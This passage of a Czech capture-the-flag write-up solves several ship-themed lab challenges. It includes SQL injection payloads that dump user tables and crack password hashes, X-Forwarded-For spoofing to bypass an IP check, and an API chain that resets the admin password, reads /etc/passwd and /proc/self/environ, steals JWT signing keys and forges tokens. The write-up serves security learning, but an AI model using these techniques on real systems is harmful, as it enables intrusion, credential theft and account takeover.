  thrown in <b>/var/www/html/image.php</b> on line <b>9</b><br />
```
-> určuje tabulku

Změníme `type` na `xxx`: http://navigation-plan.cns-jv.tcc/image.png?type=xxx&t=targets&id=1
```
<br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Unknown column 'xxx' in 'field list' in /var/www/html/image.php:9
Stack trace:
#0 /var/www/html/image.php(9): mysqli_query(Object(mysqli), 'SELECT xxx FROM...')
#1 {main}
  thrown in <b>/var/www/html/image.php</b> on line <b>9</b><br />
```
-> určuje sloupec

Vypadá to na neošetřený web dovolující útok pomocí [SQL injection](https://cs.wikipedia.org/wiki/SQL_injection).
Dosazením nevalidní syntaxe za `type` si můžeme obstarat kus query: <http://navigation-plan.cns-jv.tcc/image.png?type=)&t=xxx&id=8">
```sql
`) FROM xxx JOIN files ON targets.id = files.id_target WHERE targets.id = 8`
```

Vidíme, že `WHERE targets.id = ` je tam napevno, stejně tak `JOIN files`. Ale
můžeme si namísto sloupce vytahovat cokoliv jiného, když to ještě base64 enkódujeme.

Zjistíme tabulky v databázi, budeme chtít poslat tento výraz namísto názvu sloupce.
```sql
TO_BASE64((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='navigation'))
```
```sh
$ curl -s "http://navigation-plan.cns-jv.tcc/image.png?type=TO_BASE64((SELECT%20GROUP_CONCAT(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema=%27navigation%27))&t=targets&id=8"
files,targets,users
```

Dále již budu uvádět jen části SQL, které nastavíme do `type`, zkonstruovat URL
už je pak hračka. Když teď víme názvy tabulek, tak je prozkoumáme a zjistíme, co
mají za sloupce:
```sql
TO_BASE64((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='navigation' AND table_name='targets'))
```
* `targets`: id,id_user,name,location,raw,status,date_added,finished
* `files`: id_file,id_user,id_target,data
* `users`: id,username,password,rank,active

Vytáhnout všechny hodnoty z konkrétní tabulky můžeme třeba takto:
```sql
TO_BASE64((SELECT GROUP_CONCAT(id) FROM users))
```

Postupně si vytáhneme všechny údaje o uživatelích. Hesla jsou SHA256 hashe,
crackneme je pomocí https://crackstation.net/ obsahující hashe pro spoustu
běžných hesel:
* id=1, username=engeneer, rank=1, active=0, password=15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225
  * cracked: `123456789`
* id=2, username=captain, rank=0, active=1, password=7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537
  * cracked: `$captainamerica$`
* id=3, username=officer, rank=1, active=1, password=6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb
  * heslo jsme nenašli :(

Zalogujeme se jako `captain` a pod Target 4 (Mariana Trench) je `FLAG{fmIT-QkuR-FFUv-Zx44}`.

### Keyword of the day (4/4 body)

> Ahoy, officer,
>
> one of deck cadets (remember your early days onboard) had a simple task to
> prepare simple web application to announce keyword of the day. He claimed that
> the task is completed, but he forgot on which port the application is running.
> Unfortunately, he also prepared a lot of fake applications, he claims it was
> necessary for security reasons. Find the keyword of the day, so daily routines
> on ship can continue.
>
> May you have fair winds and following seas!
>
> The webs are running somewhere on server `keyword-of-the-day.cns-jv.tcc`.

Když uděláme `nmap -p- keyword-of-the-day.cns-jv.tcc`, tak zjistíme, že server
odpovídá celkem na 234 portech z rozsahu od 60000 do 60495 ([seznam](15_Keyword_of_the_day/ports.txt)).

Každý z nich zdá se vrací na pohled tu stejnou stránku, ale obsah všech
se mění každou sekundu! Liší se uvnitř jejich [obfuskovaného javascriptu](15_Keyword_of_the_day/original.js).
Přesněji vždy v jednom elementu stringového pole (zvýrazněno níže):
```js
…,'158706KaxUIc','82f6647715','XpYtE','getElement','zkkfn']…
//                ^^^^^^^^^^
```

[Obfuskace](https://cs.wikipedia.org/wiki/Obfuscator) je pozměnění nějakého kódu
tak, aby byl velmi špatně čitelný. Často se tak brání proti příliš jednoduchému
ukradení Javascriptu ze stránek nebo se v obfuskovaném kódu často ukrývají
zákeřné skripty před objevením antiviry a podobnými skenery.

Existují ale naštěstí deobfuskátory :) Zkusíme třeba <https://obf-io.deobfuscate.io/>
a dostaneme tento kód.

```js
function getRandomInt(_0x12721b, _0x4bd30f) {
  _0x12721b = Math.ceil(_0x12721b);
  _0x4bd30f = Math.floor(_0x4bd30f);
  return Math.floor(Math.random() * (_0x4bd30f - _0x12721b) + _0x12721b);
}
setTimeout(function () {
  fn = getRandomInt(1, 4);
  document.getElementById("loader").style.display = "none";
  qn = "95f54a6471";
  document.getElementById("myImage").src = "img/" + fn + ".png";
}, getRandomInt(1, 7) * 1000);
```

Po chvíli zkoumání:

* Je tam divné nepoužité `qn = "95f54a6471";`, které právě závisí na tom jednom
  měnícím se elementu obfuskovaného stringového pole.
* Kód zobrazí po chvilce obrázky `img/1.png` až `img/4.png`, existují ale až po číslo 7.
  Můžeme zkontrolovat, že jsou obrázky všude stejné:
```sh
cat ports.txt | while read port; do echo -n "$port: "; curl -s http://keyword-of-the-day.cns-jv.tcc:$port/img/1.png | md5sum; done
# vyjde nám, že jsou všude stejné :/
```

Znova se podíváme na Javascripty, odstraníme z nich měnící se část a uděláme md5sum,
abychom našli, jestli je nějaká stránka odlišná:
```sh
$ cat ports.txt | while read port; do echo -n "$port: "; curl -s http://keyword-of-the-day.cns-jv.tcc:$port | sed "s/'158706KaxUIc','[^']*','XpYtE'//" | md5sum; done
60000: 315b78a76684f24209855d40addca216  -
60004: 315b78a76684f24209855d40addca216  -
60009: 315b78a76684f24209855d40addca216  -
60010: 315b78a76684f24209855d40addca216  -
60011: 315b78a76684f24209855d40addca216  -
60015: 315b78a76684f24209855d40addca216  -
[...]
60257: 5643468bd3a68c77f71d506e4957c66d  -
[...]
60487: 315b78a76684f24209855d40addca216  -
60488: 315b78a76684f24209855d40addca216  -
60489: 315b78a76684f24209855d40addca216  -
60494: 315b78a76684f24209855d40addca216  -
60495: 315b78a76684f24209855d40addca216  -
```

Jedna stránka vyčuhuje, její Javascript po de-obfuskaci vypadá takto (zobrazuje
obrázek podle `qn`, ne `fn` a navíc `948cd06ca7` se nemění, narozdíl od zbytku stránek).
```js
function getRandomInt(_0x12721b, _0x4bd30f) {
  _0x12721b = Math.ceil(_0x12721b);
  _0x4bd30f = Math.floor(_0x4bd30f);
  return Math.floor(Math.random() * (_0x4bd30f - _0x12721b) + _0x12721b);
}
setTimeout(function () {
  fn = getRandomInt(1, 4);
  document.getElementById("loader").style.display = "none";
  qn = "948cd06ca7";
  document.getElementById("myImage").src = "img/" + qn + ".png";
}, getRandomInt(1, 7) * 1000);
```

Tento [obrázek](http://keyword-of-the-day.cns-jv.tcc:60257/img/948cd06ca7.png) říká `For FLAG follow this URI /948cd06ca7`. Na tomto [odkazu](http://keyword-of-the-day.cns-jv.tcc:60257/948cd06ca7/)
na stejném portu pak získáme vlajku: `FLAG{DEIE-fiOr-pGV5-8MPc}`

### Signal flags (5/5 bodů)

> Ahoy, officer,
>
> after a reboot at 2023-10-02 11:30:18 UTC, the On-board signal flag
> recognition system (OBSF-RS) has malfunctioned. The signal flags are no more
> recognized and the only working function is to generate and save schematic
> views, which are created every time a ship in the vicinity changes its
> signaling. We need to know what the surrounding ships signaled and if we have
> missed something important.
>
> May you have fair winds and following seas!
>
> Download the [schematic views](https://owncloud.cesnet.cz/index.php/s/J0z72ztOKzMLdHR/download).

Na uvedeném odkazu dostaneme 90 obrázku o velikosti zhruba 4K*2K pixelů
vypadajících podobně jako tento:

![](14_Signal_flags/image_example.png)

Na každém obrázku je loď a:

* nějaká textová metadata
* vlajka lodi (vždy v zeleném rámečku a velká)
* vlajky zpráv (vždy v zeleném rámečku a jednoznačně uspořádané zvrchu dolů)

Na extrakci textových informací můžeme použít třeba [Tesseract OCR](https://github.com/tesseract-ocr/tesseract)
a pak pomocí jeho výstupu přejmenovat soubory popořadě podle timestampu z obrázku (stačí podle času):

```sh
$ sudo apt install tesseract-ocr python3-opencv
$ cd images
$ for a in *; do tesseract "$a" "$a"; done
$ for a in *.png; do
        id=`cat "$a.txt" | grep "Ship object ID:" | tr -dc '0-9'`
        t=`cat "$a.txt" | grep "Timestamp:" | sed -E 's/.*GMT 2023-10-02 ([0-9:]*).*/\1/' | tr -d ':'`
        # Přejmenujeme soubory popořadě podle ID a času
        mv "$a" "$id-$t-$a"
done
```

Teď již máme obrázky popořadě, ale co s nimi? Vezmeme si k ruce nějakou pomůcku
pro dekódování [námořní vlajkové abecedy](https://cs.wikipedia.org/wiki/N%C3%A1mo%C5%99n%C3%AD_vlajkov%C3%A1_abeceda)
a prozkoumáme ručně pár obrázků.

Kódy na vlajkách skoro vždy začínají hexadecimálně `0x`, ale ruční hledání vlajky
by bylo asi otravné. Ručně získáme obrázky vlajek (třeba pomocí Gimpu) a uložíme
si je je do složky [`flags/`](14_Signal_flags/flags/):


|   |                                  |   |                                  |   |                                  |   |                                  |   |                                  |
| - | -------------------------------- | - | -------------------------------- | - | -------------------------------- | - | -------------------------------- | - | -------------------------------- |
| A | ![](14_Signal_flags/flags/a.png) | I | ![](14_Signal_flags/flags/i.png) | Q | —                                | Y | ![](14_Signal_flags/flags/y.png) | 2 | ![](14_Signal_flags/flags/2.png) |
| B | ![](14_Signal_flags/flags/b.png) | J | —                                | R | ![](14_Signal_flags/flags/r.png) | Z | —                                | 3 | ![](14_Signal_flags/flags/3.png) |
| C | ![](14_Signal_flags/flags/c.png) | K | ![](14_Signal_flags/flags/k.png) | S | ![](14_Signal_flags/flags/s.png) |   |                                  | 4 | ![](14_Signal_flags/flags/4.png) |
| D | ![](14_Signal_flags/flags/d.png) | L | ![](14_Signal_flags/flags/l.png) | T | —                                |   |                                  | 5 | ![](14_Signal_flags/flags/5.png) |
| E | ![](14_Signal_flags/flags/e.png) | M | ![](14_Signal_flags/flags/m.png) | U | —                                |   |                                  | 6 | ![](14_Signal_flags/flags/6.png) |
| F | ![](14_Signal_flags/flags/f.png) | N | ![](14_Signal_flags/flags/n.png) | V | ![](14_Signal_flags/flags/v.png) |   |                                  | 7 | ![](14_Signal_flags/flags/7.png) |
| G | —                                | O | ![](14_Signal_flags/flags/o.png) | W | ![](14_Signal_flags/flags/w.png) | 0 | ![](14_Signal_flags/flags/0.png) | 8 | ![](14_Signal_flags/flags/8.png) |
| H | ![](14_Signal_flags/flags/h.png) | P | ![](14_Signal_flags/flags/p.png) | X | ![](14_Signal_flags/flags/x.png) | 1 | ![](14_Signal_flags/flags/1.png) | 9 | ![](14_Signal_flags/flags/9.png) |

Pomocí opencv si napíšeme Python skript na rozpoznávání vlajek. Na každý obrázek
poštveme `cv2.matchTemplate` a najdeme výskyty každé vlajky. Pak už stačí jenom
sort podle *y* pozice (shora dolů) a případně dekódovat hex stringy.

Skript: [`solver.py`](14_Signal_flags/solver.py)

Abychom nematchovali vlajky znaků na vlajkách států, je lepší hledat vlajky i se
zeleným rámečkem.

Po chvíli počítání vypadne pár textů ([kompletní výstup](14_Signal_flags/results.txt)).
Zajímavé jsou ty vyslané finskou lodí:
```
CNS Josef verich, are your nets ok, too? ;-)
CNS Josef verich, you can improve them by RkxBR3tsVHJHLTNvWG4tYW9aTi1aNHFNfQ== !
```

Po base64 dekódování získáme finálně vlajku `FLAG{lTrG-3oXn-aoZN-Z4qM}`. Toto
byla úloha, u které bylo od začátku jasné, co s ní dělat, a jsem rád, že jsem si
díky ní zase po čase osvěžil práci s OpenCV.

## Below deck troubles

### Cat code (3/3 body)

> Ahoy, officer,
>
> due to the lack of developers on board, the development of the access code
> generator for the satellite connection was entrusted to the cat of the chief
> officer. Your task is to analyze the cat's creation and find out the code.
>
> May you have fair winds and following seas!
>
> Download the [cat code](https://owncloud.cesnet.cz/index.php/s/QqgJmk6FdCg3dis/download).

Po stažení souboru se nám naskytne pohled na dva velice umňoukané kusy Pythoního
kódu :D

Hlavní spustitelný kód je [`meowmeow.py`](13_Cat_code/original/meowmeow.py),
který využívá metody z ['meow.py`](13_Cat_code/original/meow.py). Když se
pokusíme kód spustit, tak se nás zeptá "Who rules the worlds?" a očekává
odpověď.

Krátký pohled do zdrojáku nám napoví, že jediná správná odpověď je `kittens`
a pak se zavolá `meowmeow(meow(sum([ord(meow) for meow in meoword])))` kde
`meoword` je `kittens`, takže je to vlastně ekvivalentní zavolání
`meowmeow(meow(770))`. To byla ta jednodušší část.

Když teď kód zkusíme spustit, tak se nám obrazovka zaplní nekonečně mňoukáním
a budeme čekat věčně. Pojďme se tedy podívat do `meow.py`.

Samotná funkce `meowmeow()` není to, co trvá dlouho. Ta jen dostane velké číslo,
převede ho na string a pak do něj indexuje pomocí velkého listu čísel, aby
sestavila jiná čísla, která pak finálně prožene skrze `chr` na písmenka.
Zamotané, ale tohle dlouho netrvá.

To co ale trvá dlouho je `meow()`, ta totiž počítá
[Fibonacciho číslo](https://cs.wikipedia.org/wiki/Fibonacciho_posloupnost) a to
rekurzivně podle definice, což je exponenciální v době výpočtu (a taky vede
k exponenciálně mnoha zamňoukáním do terminálu :D). To ale můžeme lehce
opravit pomocí [dynamického programování](https://ksp.mff.cuni.cz/kucharky/dynamicke-programovani/) aneb nepočítat stejné věci vícekrát, ale uložit si je.
V Pythonu to můžeme lehce zařídit pomocí dekorátorů:

```python
def memoize(f):
    memo = {}
    def helper(x):
        if x not in memo:
            memo[x] = f(x)
        return memo[x]
    return helper

@memoize
def meow(kittens_of_the_world):
    ...
```

Druhá věc, kterou potřebujeme udělat, je zvětšit povolenou hloubku rekurze a to
třeba takto:

```python
import sys
sys.setrecursionlimit(2000)
```

Upravené soubory: [`meow.py`](13_Cat_code/meow.py), [`meowmwow.py`](13_Cat_code/meowmeow.py)

Pak po spuštění již dostaneme docela málo zamňoukání a pak také text
`FLAG{YcbS-IAbQ-KHRE-BTNR}`. A jen jako zpestření, 770. Fibonacciho číslo, které
se předává do `meowmeow()`, vypadá takto:

```
37238998302736542981557591720664221323221262823569669806574084338006722578252257702859727311771517744632859284311258604707327062313057129673010063900204812137985
```

### Component replacement (3/3 body)

> Ahoy, officer,
>
> the ship had to lower its speed because of broken `fuel efficiency enhancer`.
> To order a correct spare part, the chief engineer needs to know exact
> identification code of the spare part. However, he cannot access the web page
> listing all the key components in use. Maybe the problem has to do with
> recently readdressing of the computers in the engine room - the old address
> plan for whole ship was based on range `192.168.96.0/20`. Your task is to find
> out the identification code of the broken component.
>
> May you have fair winds and following seas!
>
> The webpage with spare parts listing is available at <http://key-parts-list.cns-jv.tcc>.

Když si otevřeme zmíněnou stránku, tak nám vypíše "You are attempting to access
from the IP address 10.200.0.60, which is not assigned to engine room. Access denied."

Když se podíváme na hlavičky, tak poznáme, že stránka je napsaná v PHP a běží
pod Apachem:

```sh
$ curl -v "http://key-parts-list.cns-jv.tcc/"
[…]
< Server: Apache/2.4.56 (Debian)
< X-Powered-By: PHP/8.0.30
[…]
```

Kontrolu IP adresy dělá velmi pravděpodobně právě PHP, do toho se musí IP adresa
nějak dostat (podobně jako do čehokoliv dalšího běžícího za nějakou proxy).
Běžně se na to používá HTTP hlavičky [`X-Forwarded-For`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
a `X-Real-Ip`, zkusme nějakou z nich nastavit:

```sh
$ curl -H "X-Forwarded-For: 1.2.3.4" http://key-parts-list.cns-jv.tcc
You are attempting to access from the IP address 1.2.3.4, which is not assigned to engine room. Access denied.
```

Funguje to, teď jen potřebujeme uhádnout adresu strojovny. Naštěstí v prefixu `/20` není
adres zase tak mnoho (je jich 4096). Na vylistování adres můžeme zneužít třeba
známý `nmap`, jehož výstup trochu ořízneme pomocí `awk` a pak na každou adresu
spustíme `curl`:

```sh
nmap -sL -n 192.168.96.0/20 | awk '/Nmap scan report/{print $NF}' | while read ip; do
    echo $ip
    curl -s -H "X-Forwarded-For: $ip" "http://key-parts-list.cns-jv.tcc/" | grep -v "Access denied"
done
```

Po chvíli zkoušení adres zjistíme, že web povoluje adresy z rozsahu
`192.168.100.32` až `192.168.100.63`. V seznamu najdeme `Fuel efficiency enhancer`
a flag `FLAG{MN9o-V8Py-mSZV-JkRz}`.

### U.S.A. (5/5 body)

> Ahoy, officer,
>
> on our last port visit, a new U.S.A. (Universal Ship API) interface was
> installed on the ship. In order to unlock new experimental ship functions, the
> special code has to be entered into ship FLAG (First Layer Application
> Gateway). Your task is to get this FLAG code from U.S.A.
>
> May you have fair winds and following seas!
>
> The U.S.A. is available at <http://universal-ship-api.cns-jv.tcc>.

Jak už je u pokročilejších úloh zvykem, tak první nažhavíme `nmap`, který nám
ale poví, že je na celém serveru povolený jediný port:

```
PORT   STATE SERVICE
80/tcp open  http
```

Je na něm API, dá se uhádnout [`/api/`](http://universal-ship-api.cns-jv.tcc/api)
a pak s nápovědou z vraceného JSONu zkoušet hledat další. Najdeme endpointy:

* [`/api/v1`](http://universal-ship-api.cns-jv.tcc/api/v1) – rozcestník na `admin` a `user`
* [`/api/v1/admin`](http://universal-ship-api.cns-jv.tcc/api/v1/admin/) – podle hlaviček chce `Bearer` token
* pod `/api/v1/user/` asi něco je, ale neumíme to uhádnout

Pak se dá uhádnout `/docs` a `openapi.json`, ale chtějí autorizaci. Asi zde ale
bude ještě několik dalších endpointů. Zkusíme použít [kiterunner](https://github.com/assetnote/kiterunner)
na uhádnutí běžných enpointů a metod, které podporují:

```sh
$ kr scan --fail-status-codes 401 -w routes-large.kite http://universal-ship-api.cns-jv.tcc/api/v1
POST    400 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1/user/login 0cf685c14b645f9505187d0e64e45c6a688aa513
$ kr scan --fail-status-codes 401 -w routes-large.kite http://universal-ship-api.cns-jv.tcc/api/v1/user
POST    422 [     88,    6,   1] http://universal-ship-api.cns-jv.tcc/api/v1/user/signup 0cf68c053155400dab3dc59b0ef53def2f7ef09f
$
```

Objevili jsme zajímavé endpointy `POST /api/v1/user/login` a `POST /api/v1/user/signup`.
První z nich chce `application/x-www-form-urlencoded` POST a když mu posíláme
requesty, napoví nám, že potřebuje `username` a `password`:

```sh
$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/login"
{"detail":[{"loc":["body","username"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}
$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/login" -d 'username=admin&password=pass'; echo
{"detail":"Incorrect username or password"}
```

Druhý z nich `POST /api/v1/user/signup` chce JSON. Po chvíli pokusů a napovídání
od API se nám nakonec povede registrovat:

```sh
$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/signup"
{"detail":[{"loc":["body"],"msg":"field required","type":"value_error.missing"}]}
$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/signup" -d 'a'
{"detail":[{"loc":["body"],"msg":"value is not a valid dict","type":"type_error.dict"}]}
$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/signup" -H "Content-Type: application/json" -d '{}'
{"detail":[{"loc":["body","email"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}
$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/signup" -H "Content-Type: application/json" -d '{"email": "setnicka@seznam.cz", "password": "123456"}'
--> 201 Created
```

Přihlásíme se a dostaneme access token:

```sh
$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/login" -d 'username=setnicka@seznam.cz&password=123456'
{"access_token":"eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3NzMyMzEyLCJpYXQiOjE2OTcwNDExMTIsInN1YiI6IjIiLCJhZG1pbiI6ZmFsc2UsImd1aWQiOiI1MTc0YzExNi1mZDU1LTQ5MzQtOTI4Mi01NTc3MzlkM2ZlZmMifQ.qiW3fNQzcAtBRBkvv86_V2wf1GrP8ZIsSXSBjOU9axEu3kK7ik8ts7D7YhD8TcSN8ga0x5nhQsqtHll5uYts8hPQWzCVg7CiB8omztUID_CNgX4PbwhFJl50NI3hV_hKzTGZFBdIwKaGBqfHdHub7VZtnrMbBwEpU2hrRD_zRiXbQPdmjfdmubHvSBGIzwCiCyplNeOrXlZtd_eza7LKuFygSZZFTvI0LmjCvaxb70q8H98rm-E1CjLIUA5xlgabsUyRrKybu1D64_gG1o7QdAE9YQ5T75ozTbPhiE4ZxhZONFe-IoL_pMaecqWyrnNl53FFUDD1vxk_GAS-_kgWhk9PkO194UuHc-QuwVQ7eGFwudXL5qCW5Hy4MqYpWCHOQ07MZs-P6NjPmf_G-suY243QN-EG8zTbtM6hUc7b1AzSsqzAIBwh48dUF0zg6RUYp-MO3ySg_qymBMZy20mNZFuVTReZ7QhkOpYgio2BlObUy6ZO732sFeL8_WUShsS7DZmvJWkpRnSur8v5VWZNDfITynTco4JhCzfrtHoemRYcMmHR1g5ZXTgQIluKk_dgqlS4RBrhhmTFzAPO6pmzXIb_B_vcOancFzSbkWDohOejOGT1x-CA6mwavSlrFBqaS_vpKS0zYZX5PeVB7b1bcyL1GOsNr5rIfBEBrO3-aFU","token_type":"bearer"}
```

Z tokenu lze dekódovat JWT token (první dvě části oddělené tečkou, pak je podpis):
```json
{
  "alg": "RS384",
  "typ": "JWT"
}.{
  "type": "access_token",
  "exp": 1697732312,
  "iat": 1697041112,
  "sub": "2",
  "admin": false,
  "guid": "5174c116-fd55-4934-9282-557739d3fefc"
}.[signature]
```

S tokenem se můžeme vydat po systému. Do `/api/v1/admin` se stále nedostaneme
(na to nemáme v tokenu nahozené políčko `admin`), ale můžeme získat OpenAPI
dokumentaci:

```sh
$ curl -v -H "Authorization: Bearer …" "http://universal-ship-api.cns-jv.tcc/openapi.json" > openapi.json
```

Dokumentace: [`openapi.json`](17_USA/openapi.json)

Všimneme si zajímavých endpointů:
* `PUT /api/v1/admin/getFlag` – sem nás to nepustí
* `POST /api/v1/admin/file` – sem nás to taky nepustí
* `POST /api/v1/user/updatepassword` – umožní nám nastavit nový `password`, ale `admin` field nezmění
* `GET /api/v1/user/{user-id}`

My jsme user id=2, kdo je user id=1?
```json
{"guid":"b801175a-a949-4137-ae1f-7c05a2c4bfde","email":"admin@local.tcc","date":null,"time_created":1690796892351,"admin":true,"id":1}
```

Jde mu změnit heslo? ANO! :D

```sh
$ curl -X POST -v -H "Authorization: Bearer $token" "http://universal-ship-api.cns-jv.tcc/api/v1/user/updatepassword" -H "Content-Type: application/json" -d '{"guid": "b801175a-a949-4137-ae1f-7c05a2c4bfde", "password": "aiwohc7O"}'
{"guid":"b801175a-a949-4137-ae1f-7c05a2c4bfde","email":"admin@local.tcc","date":null,"time_created":1690796892351,"admin":true,"id":1}
```

Přihlásíme se a jdeme pro vlajku:
```sh
$ curl -X POST "http://universal-ship-api.cns-jv.tcc/api/v1/user/login" -d 'username=admin@local.tcc&password=aiwohc7O'; echo
{"access_token":"eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3NzMzOTMzLCJpYXQiOjE2OTcwNDI3MzMsInN1YiI6IjEiLCJhZG1pbiI6dHJ1ZSwiZ3VpZCI6ImI4MDExNzVhLWE5NDktNDEzNy1hZTFmLTdjMDVhMmM0YmZkZSJ9.XoIlOQIquvmnkBRCY4ZKriBXXv3SUKur1XAyWYJ8Z9XC-_mBEwIpN4EFd0qhAy9DRf5iyhg72xrMTyONjorA0Dom8EQ_udOhkFalYqOhGtHAZxNTdLnheirteJCUJ4Icmsv-YOi768YlFG1CdTgV1mO8QkKJwQ2k-UDezg6OGui780p_z3VL5Ar8wpIMejexEqsagoQ327qnQ5I-l52cagMg3MpC-XU1sysRJsnifKN1KqZHFpElzXt0SLYuMSbnX78Z7SlX8AwJvUixK9OzmYXhvHECbR7rHGMGMB8LpxwUG1maZSEdaQxbgOuYRpUarGZ2se2Q-3aORWrHjIjh1enIgKqIFdbZABFP1RwoSJTRxTHRPcRqwPEmSUb4XTqWvQXJep__L4Sb2fbTs7ev0RB_ht2tLPFpIt-SVAAkprF6yF19XUdA_6Rsq2CQKEtZhzsqOBYxVOsRcY7S-JMaq-ze_Gv8CEjZYNImOd_257xdvNJ7WOAR72IrfYOhykMaZyLwVZW1sk9R-YDrrZu7hW8Oi0_Bk4f0Ko42ETJ87nl9nvP6GMEGrj6tPbYPi4-wA9MMKKRF9M0L2FllK-cQK00lpCuSuK7Qa_Pa9AUSOvVMKG9_qSP5eCnZT2kgUFYvaloSd630dAa8xlDWFgYY_xuMaHmPy8-6eMqerZzCNs0","token_type":"bearer"}

$ curl -X PUT -v -H "Authorization: Bearer $admin_token" "http://universal-ship-api.cns-jv.tcc/api/v1/admin/getFlag"
{"detail":"flag-read key missing from JWT"}
```

Tak jednoduché to bohužel není :( Musíme tedy prozkoumat i `/api/v1/admin/file` endpoint. A ten je překvapivě mocný:

```sh
curl -X POST -v -H "Authorization: Bearer $admin_token" "http://universal-ship-api.cns-jv.tcc/api/v1/admin/file" -H "Content-Type: application/json" -d '{"file": "/etc/passwd"}'
-> vrátí /etc/passwd
```

Neumožní nám ale vylistovat složku, musíme tedy zjistit názvy souborů. Postupně
zkoumáme filesystém okolo sebe:
* Dotazem na `../etc/passwd` zjistíme, že běžíme v 1 podsložce
* `__init__.py` je prázdný soubor ale existuje
* `../app/__init__.py` je asi ten stejný soubor
* `/proc/self/environ` nám vrátí nastavení environmentu pro aktuální proces:

```ini
HOSTNAME=c3084a02d5ed
PYTHON_VERSION=3.10.13
APP_MODULE=shipapi.main:app
PWD=/app
PORT=80
PYTHON_SETUPTOOLS_VERSION=65.5.1
TZ=Europe/Prague
HOME=/home/appuser
LANG=C.UTF-8
VIRTUAL_ENV=/app/venv
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
PYTHONPATH=.
HOST=0.0.0.0
SHLVL=0
PYTHON_PIP_VERSION=23.0.1
VIRTUAL_ENV_PROMPT=(venv)
PYTHON_GET_PIP_SHA256=45a2bb8bf2bb5eff16fdd00faef6f29731831c7c59bd9fc2bf1f3bed511ff1fe
PS1=(venv)
PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/9af82b715db434abb94a0a6f3569f43e72157346/public/get-pip.py
PATH=/app/venv/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Zajímavá proměnná je `APP_MODULE=shipapi.main:app`. Podíváme se na cestu `shipapi/main.py`:

```sh
$ curl -s -X POST -H "Authorization: Bearer $admin_token" "http://universal-ship-api.cns-jv.tcc/api/v1/admin/file" -H "Content-Type: application/json" -d '{"file": "shipapi/main.py"}' | jq -r '.file' > shipapi/main.py
```

Postupně postahujeme (a z nich odhadneme přes importy další jména) velkou část
aplikace (viz její [složka](17_USA/shipapi/)). A to včetně klíčů používaných pro
podepsání JWT tokenu:

* [`shipapi/main.js`](17_USA/shipapi/main.js)
* [`shipapi/appconfig/config.py`](17_USA/shipapi/appconfig/config.py)
* [`shipapi/appconfig/jwtsigning.key`](17_USA/shipapi/appconfig/jwtsigning.key)
* [`shipapi/appconfig/jwtsigning.pub`](17_USA/shipapi/appconfig/jwtsigning.pub)

Pro analýzu JWT tokenů existuje krásná stránka [jwt.io](https://jwt.io/), kde
vložíme náš současný token, vložíme klíče a můžeme modifikovat JSON payload
a vyrábět nové tokeny. Přidáme si tam klíč `"flag-read": true,` a dostaneme:

```sh
flag_token=eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3NzMzOTMzLCJpYXQiOjE2OTcwNDI3MzMsInN1YiI6IjEiLCJmbGFnLXJlYWQiOnRydWUsImFkbWluIjp0cnVlLCJndWlkIjoiYjgwMTE3NWEtYTk0OS00MTM3LWFlMWYtN2MwNWEyYzRiZmRlIn0.Cy51CY0s-Z1St3jLHk7kEpHfSOmyVYjeWczNupwIqKwwgo9ggNH8x9_8HdotL4Zm19rTM7jo1eOPxpf63hvYAqGYmvQdwblqPG6NJTyzh-IF8lC5Yp65QZJIJpHdy-djRw_O3Q2W_fwvi7ANUocsNIgvmtTRD3li4IS4P8BS9stGukgpnxkStMenvf_aOohvcsMYPNR9Ak-F6CixsjXwFjOxvbjnUM7vsRDzBbSIuoupy-9d1TzFz7wgx-c9R3LqdtmmKvoj4NmF5pxKdrXVPrEl2zvxptLDWBU_cTD3pgJVA7shRkAPIAi0TV_SzbqDb5_ihEs3B8WXdv2NX6Kzt3qh73Mbklk11gkRsgKhDRqkv8ZBzRwOYFp4wuQIjfn83Y8AYtPjba_SUazUJACcp1_gokEaFcsqumU9pmDY53YVP4gkpOmxTizvUTsfemTwC8HalHM2JYAhIVLIQhSwxXHiDdQVNDusz_jKjOS8e8pSYCh-hepKJihpg-wwfOl4cnsnCohwRazuhDNOs3nXmQ5E9p1_tHX1N3xokzcj0tbqOUSNSLLM2APzlgsMQMVDVA28L7peCWC3ZcUxajTMZwz6O7CkJArQ-MPnfSy7KFU7-ht56lJzXY9bnwNLq4AGt8FSp_ypaP85I6tM_Rkox7jHN4Z9XardwClGFRACgfc

$ curl -X PUT -v -H "Authorization: Bearer $flag_token" "http://universal-ship-api.cns-jv.tcc/api/v1/admin/getFlag"
{"Flag":"FLAG{910P-iUeJ-Wwq1-i8L2}"}
```

Toto byla hezká úloha, jediný zádrhel mohl být v hádání názvů endpointů a pak
názvů souborů na disku. Ale na obojí byly způsoby, jak se přes to dostat.

### Suspicious traffic (5/5 bodů)

> Ahoy, officer,
>
